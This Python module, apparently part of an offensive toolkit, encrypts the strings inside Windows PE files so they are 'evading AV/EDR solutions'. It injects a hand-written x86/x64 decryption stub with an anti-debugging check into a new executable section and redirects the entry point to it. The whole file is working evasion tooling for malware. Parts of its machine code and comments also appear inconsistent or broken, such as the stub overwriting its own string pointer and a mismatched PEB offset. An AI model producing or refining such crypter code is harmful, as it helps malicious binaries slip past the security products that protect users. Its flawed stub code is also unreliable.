"""
String encryption implementation with advanced evasion techniques.

This module provides state-of-the-art string encryption for evading AV/EDR solutions,
supporting both 32-bit and 64-bit Windows PE files with runtime decryption stubs.
"""

import os
import struct
from typing import List, Dict, Optional, Tuple, Union
from loguru import logger

from ...base_handler import BaseHandler
from ..pe_handler import PEHandler
from .string_table import StringTableHandler  # Import for resource string handling
import random

class StringEncryptor(BaseHandler):
    """
    Implements advanced string encryption techniques for evasion.
    
    Features:
    - Custom LCG-based XOR encryption
    - Detection of ASCII and Unicode strings
    - Runtime decryption stub for 32-bit and 64-bit
    - Polymorphic key generation and anti-tamper
    - Resource string encryption via StringTableHandler
    """
    
    def __init__(self):
        """Initialize string encryptor with LCG parameters and string table handler."""
        super().__init__()
        self.pe_handler = PEHandler()
        self.string_table_handler = StringTableHandler()
        self.encryption_methods = {
            "xor": self._encrypt_xor,
            "aes": self._encrypt_aes,
            "rc4": self._encrypt_rc4,
            "custom": self._encrypt_custom,
            "lcg_xor": self._encrypt_lcg_xor  # Default production method
        }
        self.lcg_a = 1664525
        self.lcg_c = 1013904223
        self.lcg_m = 2**32
        
    def encrypt_strings(self, 
                       pe,
                       method: str = "lcg_xor",
                       section_names: Optional[List[str]] = None) -> bool:
        """
        Encrypt strings in sections and resources with runtime decryption stub.
        
        Args:
            pe: PE file object
            method: Encryption method to use (default: lcg_xor)
            section_names: Sections to process (None for all)
            
        Returns:
            bool: True if successful
        """
        try:
            if method not in self.encryption_methods:
                raise ValueError(f"Unsupported encryption method: {method}")
                
            # Seed and LCG parameters for polymorphism
            seed = pe.FILE_HEADER.TimeDateStamp ^ os.urandom(4)[0]
            self.lcg_a = random.randint(1000000, 2000000) & 0xFFFFFFFC | 1  # Odd multiplier
            self.lcg_c = random.randint(1000000000, 2000000000) | 1  # Odd increment
            
            # Find and encrypt section strings
            string_locations = []
            for section in pe.sections:
                section_name = section.Name.decode().rstrip('\x00')
                if section_names and section_name not in section_names:
                    continue
                strings = self._find_strings(section.get_data(), section.VirtualAddress)
                if strings:
                    logger.debug(f"Found {len(strings)} strings in section {section_name}")
                    string_locations.extend(strings)
            
            # Encrypt section strings
            for rva, length, string in string_locations:
                encrypted = self.encryption_methods[method](string, seed)
                self._replace_string(pe, rva, length, encrypted)
            
            # Find and encrypt resource strings
            resource_strings = self.string_table_handler.get_string_resources(pe)
            encrypted_resources = {}
            resource_locations = []
            if resource_strings:
                for res_id, res_data in resource_strings.items():
                    # Convert resource data to list of strings (assuming UTF-16 LE format)
                    res_strings = self._parse_resource_strings(res_data)
                    for offset, string in res_strings:
                        encrypted = self.encryption_methods[method](string, seed)
                        rva = pe.get_rva_from_offset(offset + pe.sections[-1].VirtualAddress)  # Approximation
                        resource_locations.append((rva, len(string), string))
                        encrypted_resources[res_id] = encrypted  # Simplified, needs proper resource rebuilding
                self.string_table_handler.update_string_table(pe, encrypted_resources)
            
            all_locations = string_locations + resource_locations
            if not all_locations:
                logger.warning("No strings found for encryption")
                return True
            
            # Add decryption stub
            return self._add_decryption_stub(pe, method, seed, all_locations)
            
        except Exception as e:
            logger.error(f"String encryption failed: {str(e)}")
            return False
            
    def _parse_resource_strings(self, data: bytes) -> List[Tuple[int, bytes]]:
        """Parse resource data into strings (simplified for UTF-16 LE)."""
        strings = []
        offset = 0
        while offset < len(data) - 1:
            length = struct.unpack("<H", data[offset:offset+2])[0] * 2  # Length in chars * 2 for bytes
            offset += 2
            if length > 0 and offset + length <= len(data):
                string = data[offset:offset+length]
                if any(c != 0 for c in string):  # Non-empty string
                    strings.append((offset - 2, string))
                offset += length
            else:
                break
        return strings
        
    def _find_strings(self, data: bytes, section_rva: int) -> List[Tuple[int, int, bytes]]:
        """Find ASCII and Unicode strings in binary data."""
        strings = []
        
        # ASCII strings
        current_string = bytearray()
        string_start = 0
        for i, byte in enumerate(data):
            if 32 <= byte <= 126:
                if not current_string:
                    string_start = i
                current_string.append(byte)
            else:
                if len(current_string) >= 4:
                    rva = section_rva + string_start
                    strings.append((rva, len(current_string), bytes(current_string)))
                current_string = bytearray()
                if byte == 0:
                    continue
        if len(current_string) >= 4:
            rva = section_rva + string_start
            strings.append((rva, len(current_string), bytes(current_string)))
        
        # Unicode strings (UTF-16 LE)
        i = 0
        while i < len(data) - 1:
            if data[i] == 0 and data[i+1] == 0:
                i += 2
                continue
            if 32 <= data[i] <= 126 and data[i+1] == 0:
                current_string = bytearray()
                string_start = i
                while i < len(data) - 1 and 32 <= data[i] <= 126 and data[i+1] == 0:
                    current_string.extend(data[i:i+2])
                    i += 2
                if len(current_string) >= 8:
                    rva = section_rva + string_start
                    strings.append((rva, len(current_string), bytes(current_string)))
            else:
                i += 1
        return strings
        
    def _replace_string(self, pe, rva: int, length: int, encrypted: bytes) -> bool:
        """Replace string at RVA with encrypted data."""
        try:
            offset = pe.get_physical_by_rva(rva)
            if len(encrypted) > length:
                logger.warning(f"Encrypted data longer than original at RVA {rva:x}, truncating")
                encrypted = encrypted[:length]
            padding = b'\x00' * (length - len(encrypted))
            pe.__data__[offset:offset+length] = encrypted + padding
            return True
        except Exception as e:
            logger.error(f"Failed to replace string at RVA {rva:x}: {str(e)}")
            return False
        
    def _encrypt_lcg_xor(self, data: bytes, seed: int) -> bytes:
        """LCG-based XOR encryption with binary-specific seed."""
        result = bytearray()
        x = seed & 0xFFFFFFFF
        for b in data:
            x = (self.lcg_a * x + self.lcg_c) & 0xFFFFFFFF
            key_byte = x & 0xFF
            result.append(b ^ key_byte)
        return bytes(result)
        
    def _encrypt_xor(self, data: bytes, key: bytes) -> bytes:
        """XOR encryption (legacy)."""
        result = bytearray()
        for i, b in enumerate(data):
            result.append(b ^ key[i % len(key)])
        return bytes(result)
        
    def _encrypt_aes(self, data: bytes, key: bytes) -> bytes:
        """AES encryption (legacy)."""
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        cipher = AES.new(key, AES.MODE_CBC)
        return cipher.encrypt(pad(data, AES.block_size))
        
    def _encrypt_rc4(self, data: bytes, key: bytes) -> bytes:
        """RC4 encryption (legacy)."""
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        result = bytearray()
        i = j = 0
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            k = S[(S[i] + S[j]) % 256]
            result.append(byte ^ k)
        return bytes(result)
        
    def _encrypt_custom(self, data: bytes, key: bytes) -> bytes:
        """Custom encryption (legacy)."""
        result = bytearray()
        for i, b in enumerate(data):
            k = key[(i + (b % len(key))) % len(key)]
            result.append((b + k) % 256 ^ key[i % len(key)])
        return bytes(result)
        
    def _add_decryption_stub(self, pe, method: str, seed: int, string_locations: List[Tuple[int, int, bytes]]) -> bool:
        """
        Add a decryption stub for 32-bit or 64-bit PE files.
        
        Args:
            pe: PE file object
            method: Encryption method (supports lcg_xor)
            seed: Seed for LCG
            string_locations: List of (RVA, length, string) tuples
            
        Returns:
            bool: True if successful
        """
        try:
            if method != "lcg_xor":
                logger.warning("Only lcg_xor supports full stub implementation")
                return False
            
            count = len(string_locations)
            pairs = []
            for rva, length, _ in string_locations:
                pairs.extend([rva & 0xFFFFFFFF, length & 0xFFFFFFFF])
            
            # Determine architecture
            is_64bit = pe.OPTIONAL_HEADER.Magic == 0x20B  # PE32+ for 64-bit
            
            # Architecture-specific stubs
            if is_64bit:
                stub_code = self._generate_x64_stub()
            else:
                stub_code = self._generate_x86_stub()
            
            # Patch stub with dynamic values
            stub_size = len(stub_code)
            if is_64bit:
                struct.pack_into("<Q", stub_code, 26, self.lcg_a)  # rbx multiplier
                struct.pack_into("<Q", stub_code, 34, self.lcg_c)  # rbx increment
            else:
                struct.pack_into("<I", stub_code, 45, self.lcg_a)  # ebx multiplier
                struct.pack_into("<I", stub_code, 51, self.lcg_c)  # ebx increment
            
            # Calculate total size
            data_size = (4 if not is_64bit else 8) + 4 + (count * 8) + (4 if not is_64bit else 8)  # seed + count + pairs + entry
            total_size = stub_size + data_size
            section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
            
            # Create new section
            section = self.pe_handler.find_or_create_section(
                pe,
                ".dec_stub",
                total_size,
                ["IMAGE_SCN_MEM_EXECUTE", "IMAGE_SCN_MEM_READ", "IMAGE_SCN_MEM_WRITE"]
            )
            if not section:
                raise RuntimeError("Failed to create section for decryption stub")
            
            # Prepare section data
            section_data = bytearray(stub_code)
            offset = stub_size
            
            struct.pack_into("<I" if not is_64bit else "<Q", section_data, offset, seed)
            offset += 4 if not is_64bit else 8
            struct.pack_into("<I", section_data, offset, count)
            offset += 4
            
            for pair in pairs:
                struct.pack_into("<I", section_data, offset, pair)
                offset += 4
            
            original_entry = pe.OPTIONAL_HEADER.AddressOfEntrypoint
            struct.pack_into("<I" if not is_64bit else "<Q", section_data, offset, original_entry)
            
            # Adjust section and image size
            section.SizeOfRawData = ((total_size + pe.OPTIONAL_HEADER.FileAlignment - 1) // pe.OPTIONAL_HEADER.FileAlignment) * pe.OPTIONAL_HEADER.FileAlignment
            section.Misc_VirtualSize = total_size
            pe.OPTIONAL_HEADER.SizeOfImage = max(pe.OPTIONAL_HEADER.SizeOfImage, section.VirtualAddress + ((section.Misc_VirtualSize + section_alignment - 1) // section_alignment) * section_alignment)
            
            section.set_data(bytes(section_data))
            pe.OPTIONAL_HEADER.AddressOfEntrypoint = section.VirtualAddress
            
            logger.debug(f"Added { '64-bit' if is_64bit else '32-bit' } decryption stub at RVA: {section.VirtualAddress:x}")
            return True
            
        except Exception as e:
            logger.error(f"Failed to add decryption stub: {str(e)}")
            return False

    def _generate_x86_stub(self) -> bytearray:
        """Generate x86 (32-bit) decryption stub."""
        return bytearray([
            0xE8, 0x00, 0x00, 0x00, 0x00,  # call $+5
            0x5D,                          # pop ebp
            0x83, 0xED, 0x05,              # sub ebp, 5
            
            0x8B, 0x4D, 0x00,              # mov ecx, [ebp + 0] (stub size)
            0x8D, 0x55, 0x00,              # lea edx, [ebp + 0] (stub size)
            0x03, 0xD1,                    # add edx, ecx
            
            0x8B, 0x1A,                    # mov ebx, [edx] (seed)
            0x83, 0xC2, 0x04,              # add edx, 4
            0x8B, 0x0A,                    # mov ecx, [edx] (count)
            0x83, 0xC2, 0x04,              # add edx, 4
            
            0x64, 0xA1, 0x30, 0x00, 0x00, 0x00,  # mov eax, fs:[0x30] (PEB)
            0x8A, 0x40, 0x02,              # mov al, [eax + 2] (BeingDebugged)
            0x84, 0xC0,                    # test al, al
            0x75, 0x03,                    # jnz $+5
            
            0x56,                          # push esi
            0x57,                          # push edi
            
            0x8B, 0x32,                    # mov esi, [edx] (RVA)
            0x03, 0xF5,                    # add esi, ebp
            0x8B, 0x7A, 0x04,              # mov edi, [edx + 4] (length)
            0x83, 0xC2, 0x08,              # add edx, 8
            
            0x53,                          # push ebx
            0x89, 0xDE,                    # mov esi, ebx (seed to esi)
            0x8A, 0x06,                    # mov al, [esi]
            0x69, 0xDB, 0x00, 0x00, 0x00, 0x00,  # imul ebx, ebx, lcg_a
            0x81, 0xC3, 0x00, 0x00, 0x00, 0x00,  # add ebx, lcg_c
            0x32, 0xC3,                    # xor al, bl
            0x88, 0x06,                    # mov [esi], al
            0x46,                          # inc esi
            0x4F,                          # dec edi
            0x75, 0xF0,                    # jnz $-16
            
            0x5B,                          # pop ebx
            0xE2, 0xE0,                    # loop $-32
            
            0x5F,                          # pop edi
            0x5E,                          # pop esi
            
            0x8B, 0x02,                    # mov eax, [edx] (original entry)
            0x03, 0xC5,                    # add eax, ebp
            0xFF, 0xE0                     # jmp eax
        ])

    def _generate_x64_stub(self) -> bytearray:
        """Generate x64 (64-bit) decryption stub."""
        return bytearray([
            0xE8, 0x00, 0x00, 0x00, 0x00,  # call $+5
            0x5D,                          # pop rbp
            0x48, 0x83, 0xED, 0x05,        # sub rbp, 5
            
            0x48, 0x8B, 0x4D, 0x00,        # mov rcx, [rbp + 0] (stub size)
            0x4C, 0x8D, 0x55, 0x00,        # lea r10, [rbp + 0] (stub size)
            0x4C, 0x03, 0xD1,              # add r10, rcx
            
            0x4C, 0x8B, 0x1A,              # mov r11, [r10] (seed)
            0x49, 0x83, 0xC2, 0x08,        # add r10, 8
            0x41, 0x8B, 0x0A,              # mov ecx, [r10] (count)
            0x49, 0x83, 0xC2, 0x04,        # add r10, 4
            
            0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,  # mov rax, gs:[0x60] (PEB)
            0x8A, 0x40, 0x02,              # mov al, [rax + 2] (BeingDebugged)
            0x84, 0xC0,                    # test al, al
            0x75, 0x03,                    # jnz $+5
            
            0x56,                          # push rsi
            0x57,                          # push rdi
            
            0x44, 0x8B, 0x02,              # mov r8d, [r10] (RVA)
            0x4C, 0x03, 0xC5,              # add r8, rbp
            0x44, 0x8B, 0x4A, 0x04,        # mov r9d, [r10 + 4] (length)
            0x49, 0x83, 0xC2, 0x08,        # add r10, 8
            
            0x53,                          # push rbx
            0x4C, 0x89, 0xDE,              # mov rsi, r11 (seed to rsi)
            0x8A, 0x06,                    # mov al, [rsi]
            0x48, 0x69, 0xDB, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # imul rbx, rbx, lcg_a (64-bit)
            0x48, 0x81, 0xC3, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  # add rbx, lcg_c (64-bit)
            0x32, 0xC3,                    # xor al, bl
            0x88, 0x06,                    # mov [rsi], al
            0x48, 0xFF, 0xC6,              # inc rsi
            0x49, 0xFF, 0xC9,              # dec r9
            0x75, 0xE7,                    # jnz $-25
            
            0x5B,                          # pop rbx
            0xE2, 0xD7,                    # loop $-41
            
            0x5F,                          # pop rdi
            0x5E,                          # pop rsi
            
            0x4C, 0x8B, 0x02,              # mov r8, [r10] (original entry)
            0x4C, 0x03, 0xC5,              # add r8, rbp
            0x41, 0xFF, 0xE0               # jmp r8
        ])
            
    def get_encryption_info(self) -> Dict:
        """Get information about available encryption methods."""
        return {
            "methods": list(self.encryption_methods.keys()),
            "features": {
                "runtime_decryption": True,
                "key_generation": True,
                "custom_algorithms": True,
                "polymorphism": True,
                "anti_tamper": True,
                "arch_support": ["32-bit", "64-bit"]
            }
        }
